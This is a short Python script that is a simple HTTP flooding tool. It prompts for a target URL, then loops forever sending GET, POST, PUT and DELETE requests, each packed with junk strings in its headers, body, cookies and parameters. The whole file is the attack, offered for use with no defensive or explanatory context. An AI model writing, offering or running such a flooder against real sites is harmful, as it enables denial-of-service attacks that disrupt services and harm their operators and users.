import requests

spam = {
	"gifgfhfhgfhiug": "giyfgdshyigfydsy9fg8sgiyfgdshyigfydsy9fg8sgiyfgdshyigfydsy9fg8s",
	"hgfifghfgh8fuhghidfu": "4g5f4g94fd4g6fd4g4df854g4df5g4df4g5f4g94fd4g6fd4g4df854g4df5g4df",
	"hgihfihfuidhifdguhfuhudyf": "nbkgbfhbgudfhihguhfdughufhuguhiuhgifdughfduhgufhduihguihfuufufuu",
	"nbkgbfhbgudfhihguhfdughufhuguhiuhgifdughfduhgufhduihguihfuufufuu": "4g5f4g94fd4g6fd4g4df854g4df5g4df4g5f4g94fd4g6fd4g4df854g4df5g4df",
	"bgiyfgdshyigfydsy9fg8sgiyfgdshyigfydsy9fg8sgiyfgdshyigfydsy9fg8srgiyfgdshyigfydsy9fg8sgiyfgdshyigfydsy9fg8sgiyfgdshyigfydsy9fg8suh": "nbkgbfhb4g5f4g94fd4g6fd4g4df854g4df5g4df4g5f4g94fd4g6fd4g4df854g4df5g4dfgudfhihguhfdughufhuguhiuhgifdughfduhgufhduihguihfuufufuu"
}

urlTS = input('URL> ')

while True:
	requests.get(
		urlTS,
		headers = spam,
		json = spam,
		cookies = spam,
		params = spam
	)
	print('[GET]')
	requests.post(
		urlTS,
		headers = spam,
		json = spam,
		cookies = spam,
		params = spam
	)
	print('[POST]')
	requests.put(
		urlTS,
		headers = spam,
		json = spam,
		cookies = spam,
		params = spam
	)
	print('[PUT]')
	requests.delete(
		urlTS,
		headers = spam,
		json = spam,
		cookies = spam,
		params = spam
	)
	print('[DELETE]')